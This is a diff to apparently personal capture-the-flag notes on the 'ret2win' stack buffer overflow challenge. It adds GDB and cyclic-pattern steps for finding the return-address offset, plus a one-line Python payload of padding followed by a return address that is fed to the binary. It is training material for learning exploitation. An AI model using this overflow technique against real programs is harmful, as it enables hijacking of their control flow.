@@ -4,6 +4,18 @@
 
 In ret2win, we need to execute the win function to get the flag by overwriting the EIP.
 
+```py
+| Finding the offset using GDB for the return address |
+- file <filename>
+- info functions
+- cyclic 100
+- run and check the RIP register which is the instruction pointer
+- cyclic -l <the four characters found>
+```
+
+python3 -c 'print("A"*offset+"return address")' > payload
+./ret2win < payload
+
 Find the offset we use the value in `RSP` register.
 
 - First two steps, add permissions using chmod  +x file name.  
